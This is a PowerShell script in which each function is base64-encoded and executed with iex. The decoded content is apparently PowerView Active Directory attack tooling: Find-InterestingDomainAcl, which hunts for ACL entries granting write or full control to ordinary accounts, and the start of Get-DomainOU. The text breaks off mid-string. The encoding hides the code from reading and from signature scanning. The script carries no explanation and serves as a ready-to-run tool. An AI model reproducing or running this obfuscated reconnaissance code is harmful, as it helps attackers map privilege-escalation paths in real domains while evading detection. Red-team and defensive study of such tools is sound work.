iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1JbnRlcmVzdGluZ0RvbWFpbkFjbCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BQ0wnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEb21haW5OYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmVzb2x2ZUdVSURzLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBbGwnLCAnUmVzZXRQYXNzd29yZCcsICdXcml0ZU1lbWJlcnMnKV0KICAgICAgICAkUmlnaHRzRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQUNMQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzb2x2ZUdVSURzJ10pIHsgJEFDTEFyZ3VtZW50c1snUmVzb2x2ZUdVSURzJ10gPSAkUmVzb2x2ZUdVSURzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSaWdodHNGaWx0ZXInXSkgeyAkQUNMQXJndW1lbnRzWydSaWdodHNGaWx0ZXInXSA9ICRSaWdodHNGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkQUNMQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRBQ0xBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQUNMQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEFDTEFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQUNMQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkQUNMQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRBQ0xBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBQ0xBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnc2FtYWNjb3VudG5hbWUsb2JqZWN0Y2xhc3MnCiAgICAgICAgICAgICdSYXcnID0gJFRydWUKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEFETmFtZUFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkUmVzb2x2ZWRTSURzID0gQHt9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAkQUNMQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4KICAgICAgICAgICAgJEFETmFtZUFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluCiAgICAgICAgfQogICAgICAgIEdldC1Eb21haW5PYmplY3RBY2wgQEFDTEFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgaWYgKCAoJF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzIC1tYXRjaCAnR2VuZXJpY0FsbHxXcml0ZXxDcmVhdGV8RGVsZXRlJykgLW9yICgoJF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzIC1tYXRjaCAnRXh0ZW5kZWRSaWdodCcpIC1hbmQgKCRfLkFjZVF1YWxpZmllciAtbWF0Y2ggJ0FsbG93JykpKSB7CiAgICAgICAgICAgICAgICBpZiAoJF8uU2VjdXJpdHlJZGVudGlmaWVyLlZhbHVlIC1tYXRjaCAnXlMtMS01LS4qLVsxLTldXGR7Myx9JCcpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFJlc29sdmVkU0lEc1skXy5TZWN1cml0eUlkZW50aWZpZXIuVmFsdWVdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZU5hbWUsICRJZGVudGl0eVJlZmVyZW5jZURvbWFpbiwgJElkZW50aXR5UmVmZXJlbmNlRE4sICRJZGVudGl0eVJlZmVyZW5jZUNsYXNzID0gJFJlc29sdmVkU0lEc1skXy5TZWN1cml0eUlkZW50aWZpZXIuVmFsdWVdCiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEROJyAkXy5PYmplY3RETgogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQWNlUXVhbGlmaWVyJyAkXy5BY2VRdWFsaWZpZXIKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjdGl2ZURpcmVjdG9yeVJpZ2h0cycgJF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5PYmplY3RBY2VUeXBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0QWNlVHlwZScgJF8uT2JqZWN0QWNlVHlwZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEFjZVR5cGUnICdOb25lJwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY2VGbGFncycgJF8uQWNlRmxhZ3MKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjZVR5cGUnICRfLkFjZVR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0luaGVyaXRhbmNlRmxhZ3MnICRfLkluaGVyaXRhbmNlRmxhZ3MKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1NlY3VyaXR5SWRlbnRpZmllcicgJF8uU2VjdXJpdHlJZGVudGlmaWVyCiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdJZGVudGl0eVJlZmVyZW5jZU5hbWUnICRJZGVudGl0eVJlZmVyZW5jZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlRG9tYWluJyAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlRE4nICRJZGVudGl0eVJlZmVyZW5jZUROCiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdJZGVudGl0eVJlZmVyZW5jZUNsYXNzJyAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcwogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZUROID0gQ29udmVydC1BRE5hbWUgLUlkZW50aXR5ICRfLlNlY3VyaXR5SWRlbnRpZmllci5WYWx1ZSAtT3V0cHV0VHlwZSBETiBAQUROYW1lQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlSZWZlcmVuY2VETikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5UmVmZXJlbmNlRG9tYWluID0gJElkZW50aXR5UmVmZXJlbmNlRE4uU3ViU3RyaW5nKCRJZGVudGl0eVJlZmVyZW5jZUROLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5UmVmZXJlbmNlRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHlSZWZlcmVuY2VETgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQE9iamVjdFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE9iamVjdCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZU5hbWUgPSAkT2JqZWN0LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE9iamVjdC5Qcm9wZXJ0aWVzLm9iamVjdGNsYXNzIC1tYXRjaCAnY29tcHV0ZXInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZUNsYXNzID0gJ2NvbXB1dGVyJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRPYmplY3QuUHJvcGVydGllcy5vYmplY3RjbGFzcyAtbWF0Y2ggJ2dyb3VwJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcyA9ICdncm91cCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkT2JqZWN0LlByb3BlcnRpZXMub2JqZWN0Y2xhc3MgLW1hdGNoICd1c2VyJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcyA9ICd1c2VyJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5UmVmZXJlbmNlQ2xhc3MgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmVzb2x2ZWRTSURzWyRfLlNlY3VyaXR5SWRlbnRpZmllci5WYWx1ZV0gPSAkSWRlbnRpdHlSZWZlcmVuY2VOYW1lLCAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4sICRJZGVudGl0eVJlZmVyZW5jZUROLCAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0RE4nICRfLk9iamVjdEROCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjZVF1YWxpZmllcicgJF8uQWNlUXVhbGlmaWVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjdGl2ZURpcmVjdG9yeVJpZ2h0cycgJF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLk9iamVjdEFjZVR5cGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEFjZVR5cGUnICRfLk9iamVjdEFjZVR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RBY2VUeXBlJyAnTm9uZScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjZUZsYWdzJyAkXy5BY2VGbGFncwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY2VUeXBlJyAkXy5BY2VUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0luaGVyaXRhbmNlRmxhZ3MnICRfLkluaGVyaXRhbmNlRmxhZ3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnU2VjdXJpdHlJZGVudGlmaWVyJyAkXy5TZWN1cml0eUlkZW50aWZpZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2VOYW1lJyAkSWRlbnRpdHlSZWZlcmVuY2VOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlRG9tYWluJyAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2VETicgJElkZW50aXR5UmVmZXJlbmNlRE4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2VDbGFzcycgJElkZW50aXR5UmVmZXJlbmNlQ2xhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsXSBVbmFibGUgdG8gY29udmVydCBTSUQgJyQoJF8uU2VjdXJpdHlJZGVudGlmaWVyLlZhbHVlICknIHRvIGEgZGlzdGluZ3Vpc2hlZG5hbWUgd2l0aCBDb252ZXJ0LUFETmFtZSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk9VIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lk9VJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgIFtBbGlhcygnR1VJRCcpXQogICAgICAgICRHUExpbmssCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRPVVNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRPVVNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeT1U9LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdG